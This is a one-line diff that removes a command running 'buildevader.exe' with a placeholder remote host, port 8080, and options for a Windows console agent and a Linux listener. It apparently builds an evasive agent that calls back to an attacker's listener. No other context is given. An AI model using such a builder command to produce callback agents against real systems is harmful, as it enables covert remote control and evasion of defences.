@@ -1,1 +1,0 @@
-buildevader.exe -rhost"ListenerIP" --rport=8080 -agentbintype="console" -agentos="windows" -agentarch=32 --listeneros="linux" -listenerarch=64  -saveas="linwin"
